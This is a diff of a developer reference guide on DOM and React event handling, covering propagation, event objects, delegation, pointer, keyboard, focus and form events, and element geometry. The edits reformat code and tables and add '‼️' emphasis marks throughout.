-     → used by "click outside", analytics, and focus-trap code that must always run
+     → used by "click outside", analytics, and focus-trap code that must always run‼️
 ```
 
 ```text
@@ -485,8 +614,8 @@ EVENTS THAT DO NOT BUBBLE (event.bubbles === false):
 event.preventDefault();
 // Cancels the BROWSER'S DEFAULT ACTION: following a link, submitting a form,
 // checking a checkbox, scrolling on wheel, opening the context menu, moving focus on mousedown.
-// Does NOT stop other listeners or propagation.
-// Only works if event.cancelable is true. Check event.defaultPrevented later.
+// Does NOT stop other listeners or propagation.‼️
+// Only works if event.cancelable is true. ‼️ Check event.defaultPrevented later.
 
 event.stopPropagation();
 // Stops the event moving to the NEXT element (up or down the tree).
@@ -508,9 +637,9 @@ event.stopImmediatePropagation();
      want "open the link, don't trigger the card"  → stopPropagation in the link handler
      want "don't navigate, handle it in JS"        → preventDefault
 
-‼️ Avoid stopPropagation as a habit. It silently breaks code you don't own:
+‼️ Avoid stopPropagation as a habit. It silently breaks code you don't own:‼️
    click-outside handlers, analytics, dropdown libraries, React's own event system.
-   Prefer checking event.target in the parent, or event.defaultPrevented.
+   Prefer checking event.target in the parent, or event.defaultPrevented.‼️
 ```
 
 ```text
@@ -518,7 +647,7 @@ LISTENER ORDER:
   - On one element, listeners run in the order they were added.
   - Inline handler (el.onclick = fn or onclick="") counts as one listener; assigning
     el.onclick again REPLACES it (addEventListener never replaces).
-  - All listeners for an event run synchronously, one after another, inside
+  - All listeners for an event run synchronously, ‼️ one after another, inside
     dispatch. A slow listener delays the next one and the paint.
   - Exceptions in one listener are reported but don't stop the others.
 ```
@@ -528,18 +657,18 @@ LISTENER ORDER:
 ## 7. The Event Object
 
 ```js
-el.addEventListener('click', (e) => {
-  e.type;            // "click"
-  e.target;          // ‼️ the element that was actually clicked — could be a deep child
-  e.currentTarget;   // ‼️ the element THIS listener is attached to (== el here)
-  e.eventPhase;      // 1 capture, 2 target, 3 bubble
-  e.bubbles;         // does this event type bubble?
-  e.cancelable;      // can preventDefault cancel anything?
-  e.defaultPrevented;// has someone already called preventDefault?
-  e.isTrusted;       // true = real user action; false = el.dispatchEvent / el.click()
-  e.timeStamp;       // ms since page load (high resolution)
-  e.composedPath();  // array of every node the event travels through, target first —
-                     // also sees inside open shadow DOM (web components)
+el.addEventListener('click', e => {
+  e.type; // "click"‼️
+  e.target; // ‼️ the element that was actually clicked — could be a deep child
+  e.currentTarget; // ‼️ the element THIS listener is attached to (== el here)
+  e.eventPhase; // 1 capture, 2 target, 3 bubble
+  e.bubbles; // does this event type bubble?
+  e.cancelable; // can preventDefault cancel anything?
+  e.defaultPrevented; // has someone already called preventDefault?
+  e.isTrusted; // true = real user action; false = el.dispatchEvent / el.click()
+  e.timeStamp; // ms since page load (high resolution)‼️
+  e.composedPath(); // array of every node the event travels through, target first —‼️
+  // also sees inside open shadow DOM (web components)
 });
 ```
 
@@ -554,33 +683,47 @@ el.addEventListener('click', (e) => {
      e.target         → <svg>  (or even <path> inside it)
      e.currentTarget  → <button>
 
-   So   e.target.dataset.id   is undefined (svg has no data-id),
+   So   e.target.dataset.id   is undefined (svg has no data-id),‼️
    while e.currentTarget.dataset.id works.
 
-   Rule: reading data from "the thing I attached to" → currentTarget.
-         "which child was clicked"                    → target (+ closest(), §8).
+   Rule: reading data from "the thing I attached to" → currentTarget.‼️
+         "which child was clicked"                    → target (+ closest(), §8).‼️
 
    ‼️ currentTarget is null after the handler returns. If you log the event and inspect
    it later in the console, or read it after an await, it's gone. Save it first:
      const btn = e.currentTarget;  await save();  btn.disabled = false;
    (React's synthetic event behaves the same.)
 
-   CSS trick that removes the problem for icons: .buy svg { pointer-events: none; }
+   CSS trick that removes the problem for icons: .buy svg { pointer-events: none; }‼️
    → clicks on the svg go to the button, so target === the button.
 ```
 
 Other properties by event family:
 
-| Family | Useful properties |
-|---|---|
-| Mouse / Pointer | `clientX/Y`, `pageX/Y`, `offsetX/Y`, `screenX/Y`, `movementX/Y`, `button`, `buttons`, `altKey/ctrlKey/metaKey/shiftKey`, `relatedTarget`, `detail` (click count), `pointerId`, `pointerType`, `pressure`, `isPrimary` (§10) |
-| Keyboard | `key`, `code`, `repeat`, `isComposing`, modifier keys, `location` (§11) |
-| Focus | `relatedTarget` (§12) |
-| Input | `data`, `inputType`, `isComposing` (§13) |
-| Wheel | `deltaX/Y/Z`, `deltaMode` (0 px, 1 lines, 2 pages) |
-| Submit | `submitter` — which button submitted the form (§13) |
-| Clipboard | `clipboardData` (§23) |
-| Drag | `dataTransfer` (§23) |
+```text
+  EVENT FAMILY        USEFUL PROPERTIES                                       MORE
+  ──────────────────  ──────────────────────────────────────────────────────  ─────
+  Mouse / Pointer     position   clientX/Y, pageX/Y, offsetX/Y, screenX/Y,     §10
+                                 movementX/Y
+                      buttons    button, buttons, detail (click count)
+                      modifiers  altKey, ctrlKey, metaKey, shiftKey
+                      pointer    pointerId, pointerType, pressure, isPrimary
+                      hover      relatedTarget
+
+  Keyboard            key, code, repeat, isComposing, modifier keys, location  §11
+
+  Focus               relatedTarget                                            §12
+
+  Input               data, inputType, isComposing                             §13
+
+  Wheel               deltaX/Y/Z, deltaMode (0 = px, 1 = lines, 2 = pages)
+
+  Submit              submitter — which button submitted the form              §13
+
+  Clipboard           clipboardData                                            §23
+
+  Drag                dataTransfer                                             §23
+```
 
 ---
 
@@ -596,7 +739,7 @@ Other properties by event family:
    - Children added LATER are handled automatically — no re-binding
    - Removing children never leaks listeners
 
-   React itself is built on this: it puts one listener per event type on the root (§9).
+   React itself is built on this: it puts one listener per event type on the root (§9).‼️
    In React you rarely write delegation by hand — but you do in vanilla JS, in
    interviews, and in large lists/tables where you put one handler on the table.
 ```
@@ -608,12 +751,12 @@ Other properties by event family:
 // </ul>
 const list = document.getElementById('todos');
 
-list.addEventListener('click', (e) => {
+list.addEventListener('click', e => {
   // ‼️ closest() walks up from whatever was clicked (maybe a text node's parent,
   // an icon inside the button) to the element you care about.
   const deleteBtn = e.target.closest('button.delete');
   if (deleteBtn && list.contains(deleteBtn)) {
-    // list.contains guards against matching an ancestor OUTSIDE the list
+    // list.contains guards against matching an ancestor OUTSIDE the list‼️
     // (closest searches all the way up to <html>).
     const id = deleteBtn.closest('li').dataset.id;
     removeTodo(id);
@@ -639,8 +782,10 @@ function TodoList({ todos, onDelete, onToggle }) {
     <ul onClick={handleClick}>
       {todos.map(t => (
         <li key={t.id} data-id={t.id}>
-          <button data-action="toggle">{t.text}</button>
-          <button data-action="delete" aria-label={`Delete ${t.text}`}>✕</button>
+          <button data-action='toggle'>{t.text}</button>
+          <button data-action='delete' aria-label={`Delete ${t.text}`}>
+            ✕
+          </button>
         </li>
       ))}
     </ul>
@@ -648,7 +793,7 @@ function TodoList({ todos, onDelete, onToggle }) {
 }
 // Usually NOT needed in React: an inline onClick={() => onDelete(t.id)} per row is cheap,
 // because React already delegates. Reach for this in very large lists, or when you
-// want rows to be memoized without passing a new function to each.
+// want rows to be memoized without passing a new function to each.‼️
 ```
 
 ```text
@@ -656,7 +801,7 @@ Delegation limits:
   - Non-bubbling events (focus, mouseenter, scroll on elements) — use focusin,
     mouseover, or capture phase instead.
   - If a child calls stopPropagation, the parent never hears it.
-  - e.target may be a Text node's parent or an SVG child — always use closest().
+  - e.target may be a Text node's parent or an SVG child — always use closest().‼️
 ```
 
 ---
@@ -668,11 +813,11 @@ Delegation limits:
 
    You write:    <button onClick={handleClick}>
 
-   React does NOT call button.addEventListener('click'). Instead, when you call
+   React does NOT call button.addEventListener('click'). ‼️ Instead, when you call
    createRoot(container), React adds ONE native listener per event type
    (capture + bubble) on the ROOT CONTAINER (#root).
 
-   When a native click bubbles up to #root, React:
+   When a native click bubbles up to #root, React:‼️
      1. finds the fiber for event.target
      2. walks up the React component tree collecting onClickCapture / onClick props
      3. wraps the native event in a SyntheticEvent
@@ -685,16 +830,15 @@ Delegation limits:
 ```jsx
 function Example() {
   function handleClick(e) {
-    e;                 // SyntheticEvent: same API as native — target, currentTarget,
-                       // preventDefault, stopPropagation, clientX, key, ...
-    e.nativeEvent;     // the real browser event underneath
-    e.currentTarget;   // the element whose onClick this is
+    e; // SyntheticEvent: same API as native — target, currentTarget,
+    // preventDefault, stopPropagation, clientX, key, ...
+    e.nativeEvent; // the real browser event underneath
+    e.currentTarget; // the element whose onClick this is
     e.stopPropagation(); // stops React propagation AND calls native stopPropagation
-    e.preventDefault();  // ‼️ returning false does NOT work in React — call this
+    e.preventDefault(); // ‼️ returning false does NOT work in React — call this
   }
   return (
-    <div onClickCapture={() => console.log('1: capture, parent')}
-         onClick={() => console.log('3: bubble, parent')}>
+    <div onClickCapture={() => console.log('1: capture, parent')} onClick={() => console.log('3: bubble, parent')}>
       <button onClick={handleClick}>2: target</button>
     </div>
   );
@@ -705,14 +849,29 @@ function Example() {
 
 ### ‼️ React event names that do not mean what the DOM name means
 
-| React prop | Native event underneath | Surprise |
-|---|---|---|
-| `onChange` on text inputs | `input` | ‼️ fires **on every keystroke**, not on blur like native `change` |
-| `onFocus` / `onBlur` | `focusin` / `focusout` | ‼️ they **bubble** in React (native focus/blur don't) — a parent's `onBlur` fires when any child loses focus |
-| `onMouseEnter` / `onMouseLeave` | emulated from `mouseover`/`mouseout` | don't bubble (matches native) |
-| `onScroll` | `scroll` | doesn't bubble since React 17 (matches native) |
-| `onDoubleClick` | `dblclick` | |
-| `onWheel`, `onTouchStart`, `onTouchMove` | `wheel`, `touchstart`, `touchmove` | ‼️ **registered as passive** — `e.preventDefault()` is ignored with a console warning |
+```text
+  REACT PROP                 NATIVE EVENT UNDERNEATH       SURPRISE
+  ─────────────────────────  ────────────────────────────  ──────────────────────────────
+  ‼️ onChange (text inputs)  input                         fires on EVERY KEYSTROKE,
+                                                           not on blur like native change
+
+  ‼️ onFocus / onBlur        focusin / focusout            they BUBBLE in React (native
+                                                           focus/blur don't) — a parent's
+                                                           onBlur fires when ANY child
+                                                           loses focus‼️
+
+  onMouseEnter /             emulated from                 don't bubble (matches native)
+  onMouseLeave               mouseover / mouseout
+
+  onScroll                   scroll                        doesn't bubble since React 17
+                                                           (matches native)
+
+  onDoubleClick              dblclick                      just a different name
+
+  ‼️ onWheel, onTouchStart,  wheel, touchstart, touchmove  registered as PASSIVE —
+     onTouchMove                                           e.preventDefault() is ignored
+                                                           with a console warning‼️
+```
 
 ```jsx
 // ‼️ Need preventDefault on wheel/touchmove (custom zoom, canvas pan, carousel)?
@@ -722,7 +881,7 @@ function ZoomCanvas() {
   useEffect(() => {
     const el = ref.current;
     function onWheel(e) {
-      e.preventDefault();            // works: we said passive: false
+      e.preventDefault(); // works: we said passive: false‼️
       zoomBy(e.deltaY);
     }
     el.addEventListener('wheel', onWheel, { passive: false });
@@ -737,7 +896,7 @@ function ZoomCanvas() {
 
    Native listeners on elements INSIDE the tree fire first (the event hasn't
    reached #root yet). Then React's handlers run (at #root). Then native listeners
-   on document / window.
+   on document / window.‼️
 
      native listener on <button>      → 1
      React onClick on <button>        → 2   (dispatched from #root)
@@ -746,11 +905,11 @@ function ZoomCanvas() {
                                              e.stopPropagation(), since React 17)
 
    Consequences:
-   - React e.stopPropagation() CANNOT stop a native listener attached directly to an
+   - ‼️ React e.stopPropagation() CANNOT stop a native listener attached directly to an
      inner element — it already ran.
    - A native listener on an inner element that calls stopPropagation() stops the
      event before it reaches #root → React's onClick never fires. ‼️ A third-party
-     widget doing this is why "my onClick suddenly doesn't fire".
+     widget doing this is why "my onClick suddenly doesn't fire".‼️
    - For document-level "click outside" listeners, prefer capture phase or
      'pointerdown' so a stopPropagation inside the app can't hide clicks from you.
 ```
@@ -764,12 +923,12 @@ function ZoomCanvas() {
 
   click          → "the user activated this". Fires for mouse, touch, pen, AND
                    keyboard (Enter on buttons/links, Space on buttons).
-                   ‼️ For buttons and links, click is what you want — not mousedown.
-  pointer events → anything about the pointer itself: drag, draw, resize handles,
-                   hover effects, press-and-hold. One API for mouse + touch + pen.
-  mouse events   → legacy; fine on desktop, but pointer events supersede them.
+                   ‼️ For buttons and links, click is what you want — not mousedown.‼️
+  pointer events → anything about the pointer itself: ‼️ drag, draw, resize handles,
+                   hover effects, press-and-hold. One API for mouse + touch + pen.‼️
+  mouse events   → legacy; fine on desktop, but pointer events supersede them.‼️
   touch events   → only for multi-touch gestures that pointer events can't express
-                   well, or old code. Pointer events cover most needs.
+                   well, or old code. Pointer events cover most needs.‼️
 ```
 
 ```text
@@ -791,20 +950,24 @@ ONE TAP on a touch screen:
 
   ‼️ No hover state exists on touch, but mouseover fires on tap → :hover "sticks"
      after tapping on some devices. Guard hover-only UI with @media (hover: hover).
-  The old 300ms click delay is gone when the page has
+  The old 300ms click delay is gone when the page has‼️
      <meta name="viewport" content="width=device-width">.
 ```
 
 ```js
 // ── Mouse button info ───────────────────────────────────────────────────────
-e.button;   // which button CHANGED: 0 left, 1 middle, 2 right, 3 back, 4 forward
-e.buttons;  // bitmask of buttons HELD now: 1 left, 2 right, 4 middle (use during move)
+e.button; // which button CHANGED: 0 left, 1 middle, 2 right, 3 back, 4 forward
+e.buttons; // bitmask of buttons HELD now: 1 left, 2 right, 4 middle (use during move)
 // 'click' only fires for the primary button. Middle → 'auxclick'. Right → 'contextmenu'
 // (preventDefault on contextmenu to show your own menu).
 
 // Modifier keys during clicks
-if (e.metaKey || e.ctrlKey) { /* Cmd+click (Mac) / Ctrl+click: open in new tab */ }
-if (e.shiftKey) { /* range selection */ }
+if (e.metaKey || e.ctrlKey) {
+  /* Cmd+click (Mac) / Ctrl+click: open in new tab */
+}
+if (e.shiftKey) {
+  /* range selection */
+}
 
 // ‼️ If you intercept link clicks for client-side navigation, let modified clicks
 // through, or Cmd+click "open in new tab" breaks:
@@ -837,7 +1000,7 @@ function onLinkClick(e) {
 // ‼️ Without capture, a fast drag leaves the handle and pointermove stops arriving.
 // setPointerCapture routes ALL further events for this pointer to the handle,
 // even outside it or outside the window, until pointerup.
-handle.addEventListener('pointerdown', (e) => {
+handle.addEventListener('pointerdown', e => {
   if (e.button !== 0) return;
   handle.setPointerCapture(e.pointerId);
   const startX = e.clientX;
@@ -847,26 +1010,34 @@ handle.addEventListener('pointerdown', (e) => {
     panel.style.width = `${startWidth + ev.clientX - startX}px`;
   }
   function onUp(ev) {
-    handle.releasePointerCapture(ev.pointerId);   // also released automatically on pointerup
+    handle.releasePointerCapture(ev.pointerId); // also released automatically on pointerup
     handle.removeEventListener('pointermove', onMove);
     handle.removeEventListener('pointerup', onUp);
     handle.removeEventListener('pointercancel', onUp);
   }
   handle.addEventListener('pointermove', onMove);
   handle.addEventListener('pointerup', onUp);
-  handle.addEventListener('pointercancel', onUp);  // ‼️ fires when the browser takes over
-                                                   // (starts scrolling, gesture, alert)
+  handle.addEventListener('pointercancel', onUp); // ‼️ fires when the browser takes over
+  // (starts scrolling, gesture, alert)
 });
 ```
 
 ```css
 /* ‼️ On touch devices the browser starts scrolling/zooming on a drag and sends
    pointercancel to your code. Tell it which gestures it should NOT handle: */
-.drag-handle  { touch-action: none; }        /* JS gets every move */
-.carousel     { touch-action: pan-y; }       /* browser scrolls vertically, JS gets horizontal */
-.map          { touch-action: none; }
+.drag-handle {
+  touch-action: none;
+} /* JS gets every move */
+.carousel {
+  touch-action: pan-y;
+} /* browser scrolls vertically, JS gets horizontal */
+.map {
+  touch-action: none;
+}
 /* Also stop text selection while dragging */
-.dragging     { user-select: none; }
+.dragging {
+  user-select: none;
+}
 ```
 
 ```text
@@ -882,15 +1053,19 @@ Hover-like events:
 
 ```js
 // Touch events (when you need multi-touch, e.g. pinch)
-el.addEventListener('touchmove', (e) => {
-  e.touches;          // all fingers currently on the screen
-  e.targetTouches;    // fingers that started on this element
-  e.changedTouches;   // fingers that changed in this event
-  const [a, b] = e.touches;
-  if (a && b) {
-    const distance = Math.hypot(a.clientX - b.clientX, a.clientY - b.clientY);
-  }
-}, { passive: false });   // passive: false only if you will preventDefault
+el.addEventListener(
+  'touchmove',
+  e => {
+    e.touches; // all fingers currently on the screen
+    e.targetTouches; // fingers that started on this element
+    e.changedTouches; // fingers that changed in this event
+    const [a, b] = e.touches;
+    if (a && b) {
+      const distance = Math.hypot(a.clientX - b.clientX, a.clientY - b.clientY);
+    }
+  },
+  { passive: false },
+); // passive: false only if you will preventDefault
 ```
 
 ---
@@ -933,23 +1108,26 @@ EVENTS:
 
 ```js
 // ── A keyboard shortcut handler ─────────────────────────────────────────────
-const isMac = /Mac|iPhone|iPad/.test(navigator.platform);   // or navigator.userAgentData
+const isMac = /Mac|iPhone|iPad/.test(navigator.platform); // or navigator.userAgentData
 
-document.addEventListener('keydown', (e) => {
+document.addEventListener('keydown', e => {
   // Don't steal keys while the user is typing in a field
   const t = e.target;
-  const typing = t instanceof HTMLElement &&
-    (t.isContentEditable || ['INPUT', 'TEXTAREA', 'SELECT'].includes(t.tagName));
+  const typing = t instanceof HTMLElement && (t.isContentEditable || ['INPUT', 'TEXTAREA', 'SELECT'].includes(t.tagName));
 
-  const mod = isMac ? e.metaKey : e.ctrlKey;     // Cmd on Mac, Ctrl elsewhere
+  const mod = isMac ? e.metaKey : e.ctrlKey; // Cmd on Mac, Ctrl elsewhere
 
-  if (mod && e.key.toLowerCase() === 'k') {      // Cmd/Ctrl+K — works even while typing
-    e.preventDefault();                          // block the browser's own Ctrl+K
+  if (mod && e.key.toLowerCase() === 'k') {
+    // Cmd/Ctrl+K — works even while typing
+    e.preventDefault(); // block the browser's own Ctrl+K
     openCommandPalette();
     return;
   }
   if (typing) return;
-  if (e.key === '/' ) { e.preventDefault(); focusSearch(); }
+  if (e.key === '/') {
+    e.preventDefault();
+    focusSearch();
+  }
   if (e.key === 'Escape') closeAll();
 });
 ```
@@ -977,7 +1155,7 @@ function onKeyDown(e) {
   // but keyCode is still 229.
   if (e.isComposing || e.keyCode === 229) return;
   if (e.key === 'Enter' && !e.shiftKey) {
-    e.preventDefault();       // don't insert a newline in a textarea
+    e.preventDefault(); // don't insert a newline in a textarea
     send();
   }
 }
@@ -989,12 +1167,28 @@ function onKeyDown(e) {
 // React keyboard handling for a custom widget (listbox navigation)
 function onKeyDown(e) {
   switch (e.key) {
-    case 'ArrowDown': e.preventDefault(); setActive(i => Math.min(i + 1, items.length - 1)); break;
-    case 'ArrowUp':   e.preventDefault(); setActive(i => Math.max(i - 1, 0)); break;
-    case 'Home':      e.preventDefault(); setActive(0); break;
-    case 'End':       e.preventDefault(); setActive(items.length - 1); break;
-    case 'Enter':     select(items[active]); break;
-    case 'Escape':    close(); break;
+    case 'ArrowDown':
+      e.preventDefault();
+      setActive(i => Math.min(i + 1, items.length - 1));
+      break;
+    case 'ArrowUp':
+      e.preventDefault();
+      setActive(i => Math.max(i - 1, 0));
+      break;
+    case 'Home':
+      e.preventDefault();
+      setActive(0);
+      break;
+    case 'End':
+      e.preventDefault();
+      setActive(items.length - 1);
+      break;
+    case 'Enter':
+      select(items[active]);
+      break;
+    case 'Escape':
+      close();
+      break;
   }
   // preventDefault on arrows stops the page from scrolling while you navigate the list
 }
@@ -1078,10 +1272,15 @@ function Combobox() {
    :focus-visible — only when the browser thinks a ring is useful (keyboard nav,
                     any text input). ‼️ Use this for focus rings — never remove
                     outlines without a replacement. */
-button:focus-visible { outline: 2px solid var(--ring); outline-offset: 2px; }
+button:focus-visible {
+  outline: 2px solid var(--ring);
+  outline-offset: 2px;
+}
 
 /* :focus-within — the element OR any descendant has focus (style a form group) */
-.field:focus-within { border-color: var(--ring); }
+.field:focus-within {
+  border-color: var(--ring);
+}
 ```
 
 ```js
@@ -1093,21 +1292,20 @@ dialog.querySelector('[autofocus], button, input')?.focus();
 previouslyFocused?.focus();
 
 // 2. Make the background unreachable while a modal is open
-document.querySelector('main').inert = true;   // no focus, no clicks, hidden from screen readers
+document.querySelector('main').inert = true; // no focus, no clicks, hidden from screen readers
 // (<dialog>.showModal() does this for you — §31)
 
 // 3. All focusable elements inside a container (for a focus trap)
-const FOCUSABLE = 'a[href], button:not([disabled]), input:not([disabled]), ' +
-  'select:not([disabled]), textarea:not([disabled]), [tabindex]:not([tabindex="-1"])';
+const FOCUSABLE = 'a[href], button:not([disabled]), input:not([disabled]), ' + 'select:not([disabled]), textarea:not([disabled]), [tabindex]:not([tabindex="-1"])';
 const nodes = [...container.querySelectorAll(FOCUSABLE)];
 ```
 
 ```jsx
 // React: autoFocus works on mount (React calls .focus() itself).
-<input autoFocus />
+<input autoFocus />;
 // For focus after an interaction, use a ref:
 const inputRef = useRef(null);
-<button onClick={() => inputRef.current?.focus()}>Edit</button>
+<button onClick={() => inputRef.current?.focus()}>Edit</button>;
 // ‼️ Focusing an element that only appears after setState: it isn't in the DOM yet in
 // the same handler. Focus it in an effect, a ref callback, or after flushSync (§27).
 ```
@@ -1138,15 +1336,15 @@ const inputRef = useRef(null);
 
 ```js
 // ── Submit ──────────────────────────────────────────────────────────────────
-form.addEventListener('submit', (e) => {
-  e.preventDefault();                       // ‼️ otherwise the page navigates/reloads
-  const data = new FormData(form);          // reads every named field
-  data.get('email');                        // one value (string or File)
-  data.getAll('tags');                      // all values for checkboxes with the same name
-  const obj = Object.fromEntries(data);     // { email: '...', password: '...' }
-                                            // (keeps only the LAST value of repeated names)
-  e.submitter;                              // the button that submitted (if any) —
-                                            // tells "Save" from "Save as draft"
+form.addEventListener('submit', e => {
+  e.preventDefault(); // ‼️ otherwise the page navigates/reloads
+  const data = new FormData(form); // reads every named field
+  data.get('email'); // one value (string or File)
+  data.getAll('tags'); // all values for checkboxes with the same name
+  const obj = Object.fromEntries(data); // { email: '...', password: '...' }
+  // (keeps only the LAST value of repeated names)
+  e.submitter; // the button that submitted (if any) —
+  // tells "Save" from "Save as draft"
   e.submitter?.value;
 });
 
@@ -1180,13 +1378,13 @@ form.addEventListener('submit', (e) => {
 ```js
 // ── Built-in validation (Constraint Validation API) ─────────────────────────
 // <input name="email" type="email" required minlength="5">
-input.checkValidity();      // true/false, fires 'invalid' on failure (doesn't show UI)
-input.reportValidity();     // same + shows the browser's message bubble
-input.validity;             // { valueMissing, typeMismatch, tooShort, patternMismatch, ... }
-input.validationMessage;    // the browser's localized message
-input.setCustomValidity('Email already taken');   // marks invalid with your message
-input.setCustomValidity('');                      // ‼️ must clear it, or it stays invalid
-form.noValidate = true;     // <form noValidate> — skip browser UI, validate yourself
+input.checkValidity(); // true/false, fires 'invalid' on failure (doesn't show UI)
+input.reportValidity(); // same + shows the browser's message bubble
+input.validity; // { valueMissing, typeMismatch, tooShort, patternMismatch, ... }
+input.validationMessage; // the browser's localized message
+input.setCustomValidity('Email already taken'); // marks invalid with your message
+input.setCustomValidity(''); // ‼️ must clear it, or it stays invalid
+form.noValidate = true; // <form noValidate> — skip browser UI, validate yourself
 
 // CSS: :invalid matches immediately (before the user typed) — looks aggressive.
 // :user-invalid matches only after the user interacted. Prefer it.
@@ -1194,20 +1392,21 @@ form.noValidate = true;     // <form noValidate> — skip browser UI, validate y
 
 ```js
 // ── Field-specific bits ─────────────────────────────────────────────────────
-input.value;                 // always a STRING, even for type="number"
-input.valueAsNumber;         // number (NaN if empty) — type number/range/date
-input.valueAsDate;           // Date — type date/time
-checkbox.checked;            // boolean
-checkbox.indeterminate = true;  // the "some selected" dash — property only, no attribute
-select.value;                // the selected option's value
-select.selectedOptions;      // for <select multiple>
-fileInput.files;             // FileList; fileInput.value = '' lets the same file be picked again
-textarea.setSelectionRange(0, 0);   // move the caret
-input.select();              // select all text
-input.selectionStart; input.selectionEnd;
+input.value; // always a STRING, even for type="number"
+input.valueAsNumber; // number (NaN if empty) — type number/range/date
+input.valueAsDate; // Date — type date/time
+checkbox.checked; // boolean
+checkbox.indeterminate = true; // the "some selected" dash — property only, no attribute
+select.value; // the selected option's value
+select.selectedOptions; // for <select multiple>
+fileInput.files; // FileList; fileInput.value = '' lets the same file be picked again
+textarea.setSelectionRange(0, 0); // move the caret
+input.select(); // select all text
+input.selectionStart;
+input.selectionEnd;
 
 // Programmatically set a value and let frameworks notice:
-input.value = 'x';           // ‼️ fires NO event. React state won't update.
+input.value = 'x'; // ‼️ fires NO event. React state won't update.
 input.dispatchEvent(new Event('input', { bubbles: true }));
 // For React-controlled inputs even that isn't enough (React tracks the last value);
 // testing libraries handle this — in app code, change the React state instead.
@@ -1217,7 +1416,7 @@ input.dispatchEvent(new Event('input', { bubbles: true }));
 // ── React: controlled vs uncontrolled ───────────────────────────────────────
 // Controlled: React state is the source of truth; the input shows `value`.
 const [email, setEmail] = useState('');
-<input value={email} onChange={e => setEmail(e.target.value)} />
+<input value={email} onChange={e => setEmail(e.target.value)} />;
 // ‼️ value without onChange → read-only input + warning.
 // ‼️ value={undefined} then a string → "changing an uncontrolled input to be controlled"
 //    warning. Initialise with '' not undefined/null.
@@ -1231,8 +1430,9 @@ function Signup() {
   }
   return (
     <form onSubmit={onSubmit}>
-      <input name="email" type="email" defaultValue="" required />
-      <button>Sign up</button>{/* type="submit" by default — intended here */}
+      <input name='email' type='email' defaultValue='' required />
+      <button>Sign up</button>
+      {/* type="submit" by default — intended here */}
     </form>
   );
 }
@@ -1269,23 +1469,55 @@ function Signup() {
                  = like offsetWidth BUT after CSS transforms (scale), and fractional
 ```
 
-| I want… | Use | Notes |
-|---|---|---|
-| Visible inner size of a box | `el.clientWidth / clientHeight` | excludes border & scrollbar |
-| Full outer size of a box | `el.offsetWidth / offsetHeight` | layout size, ignores `transform: scale` |
-| Size as drawn on screen | `el.getBoundingClientRect().width` | includes transforms, sub-pixel |
-| Position relative to the **viewport** | `el.getBoundingClientRect().top/left` | ‼️ changes as you scroll |
-| Position relative to the **document** | `rect.top + window.scrollY` | stable while scrolling |
-| Position relative to positioned parent | `el.offsetTop / offsetLeft` | relative to `el.offsetParent` |
-| Content size inc. overflow | `el.scrollWidth / scrollHeight` | |
-| Does it overflow? | `el.scrollHeight > el.clientHeight` | text truncation detection: `scrollWidth > clientWidth` |
-| Scroll position | `el.scrollTop / scrollLeft`, `window.scrollY` | §15 |
-| Viewport size, incl. scrollbar | `window.innerWidth / innerHeight` | matches CSS media queries |
-| Viewport size, excl. scrollbar | `document.documentElement.clientWidth` | usable layout width |
-| Visible area on mobile (zoom, keyboard) | `window.visualViewport.width/height` | §16 |
-| Whole document height | `document.documentElement.scrollHeight` | |
-| Screen / pixel density | `screen.width`, `window.devicePixelRatio` | DPR 2 on Retina — scale canvas by it |
-| Computed CSS value | `getComputedStyle(el).paddingLeft` | string with units |
+```text
+  I WANT…                             USE                                    NOTES
+  ──────────────────────────────────  ─────────────────────────────────────  ──────────────────
+  SIZE OF AN ELEMENT
+
+  Visible inner size of a box         el.clientWidth / clientHeight          excludes border
+                                                                             & scrollbar
+  Full outer size of a box            el.offsetWidth / offsetHeight          layout size, ignores
+                                                                             transform: scale
+  Size as drawn on screen             el.getBoundingClientRect().width       includes transforms,
+                                                                             sub-pixel
+  Content size incl. overflow         el.scrollWidth / scrollHeight
+  Does it overflow?                   el.scrollHeight > el.clientHeight      text truncated?
+                                                                             scrollWidth >
+                                                                             clientWidth
+
+
+  POSITION OF AN ELEMENT
+
+  ‼️ Relative to the VIEWPORT         el.getBoundingClientRect().top/left    changes as you
+                                                                             scroll
+  ‼️ Relative to the DOCUMENT         rect.top + window.scrollY              stable while
+                                                                             scrolling
+  Relative to positioned parent       el.offsetTop / offsetLeft              relative to
+                                                                             el.offsetParent
+
+
+  SCROLL
+
+  Scroll position                     el.scrollTop / scrollLeft,             §15
+                                      window.scrollY
+
+
+  WINDOW / VIEWPORT / SCREEN
+
+  Viewport size, incl. scrollbar      window.innerWidth / innerHeight        matches CSS
+                                                                             media queries
+  Viewport size, excl. scrollbar      document.documentElement.clientWidth   usable layout width
+  Visible area on mobile              window.visualViewport.width/height     §16
+  (zoom, keyboard)
+  Whole document height               document.documentElement.scrollHeight
+  Screen / pixel density              screen.width, window.devicePixelRatio  DPR 2 on Retina —
+                                                                             scale canvas by it
+
+
+  CSS
+
+  Computed CSS value                  getComputedStyle(el).paddingLeft       string with units
+```
 
 ```js
 // ── getBoundingClientRect in detail ─────────────────────────────────────────
@@ -1294,19 +1526,18 @@ const r = el.getBoundingClientRect();
 // relative to the VIEWPORT's top-left. right = left + width, bottom = top + height.
 
 // Is it visible in the viewport right now?
-const inView = r.top < window.innerHeight && r.bottom > 0 &&
-               r.left < window.innerWidth  && r.right > 0;
+const inView = r.top < window.innerHeight && r.bottom > 0 && r.left < window.innerWidth && r.right > 0;
 // (For ongoing checks, IntersectionObserver is far better — §17)
 
 // Position a fixed-position tooltip below a button
 const b = button.getBoundingClientRect();
 tooltip.style.position = 'fixed';
-tooltip.style.top  = `${b.bottom + 8}px`;   // fixed uses viewport coords → matches rect
+tooltip.style.top = `${b.bottom + 8}px`; // fixed uses viewport coords → matches rect
 tooltip.style.left = `${b.left}px`;
 
 // Position an absolute element inside document.body
 tooltip.style.position = 'absolute';
-tooltip.style.top  = `${b.bottom + window.scrollY + 8}px`;   // convert to document coords
+tooltip.style.top = `${b.bottom + window.scrollY + 8}px`; // convert to document coords
 tooltip.style.left = `${b.left + window.scrollX}px`;
 ```
 
@@ -1331,24 +1562,24 @@ tooltip.style.left = `${b.left + window.scrollX}px`;
 
 ```js
 // ── Reading ─────────────────────────────────────────────────────────────────
-window.scrollY;                    // page scroll (pageYOffset is the old alias)
+window.scrollY; // page scroll (pageYOffset is the old alias)
 window.scrollX;
-document.documentElement.scrollTop;// same as scrollY for the page
-el.scrollTop;                      // how far an overflow container is scrolled
+document.documentElement.scrollTop; // same as scrollY for the page
+el.scrollTop; // how far an overflow container is scrolled
 el.scrollHeight - el.clientHeight; // max scrollTop
 
 // ‼️ At the bottom? Allow a pixel: scrollTop can be fractional on zoomed / HiDPI screens
